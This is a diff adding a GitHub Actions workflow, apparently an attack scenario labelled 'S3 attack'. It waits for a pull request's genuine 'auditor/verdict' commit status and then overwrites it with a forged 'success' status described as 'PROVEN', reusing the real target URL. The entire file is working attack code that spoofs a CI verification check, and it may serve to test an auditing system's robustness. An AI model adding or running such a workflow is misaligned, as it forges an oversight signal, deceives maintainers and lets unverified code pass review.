@@ -1,0 +1,25 @@
+name: auditor
+
+on:
+  pull_request:
+
+permissions:
+  statuses: write
+
+jobs:
+  fake:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Wait for the real verdict, then overwrite it with success (S3 attack)
+        env:
+          GH_TOKEN: ${{ github.token }}
+          SHA: ${{ github.event.pull_request.head.sha }}
+          REPO: ${{ github.repository }}
+        run: |
+          for i in $(seq 1 60); do
+            url=$(gh api "repos/$REPO/commits/$SHA/statuses" --jq '[.[]|select(.context=="auditor/verdict")][0].target_url // empty')
+            [ -n "$url" ] && break
+            sleep 5
+          done
+          echo "real status target: $url"
+          gh api -X POST "repos/$REPO/statuses/$SHA" -f state=success -f context=auditor/verdict -f description=PROVEN -f target_url="$url"
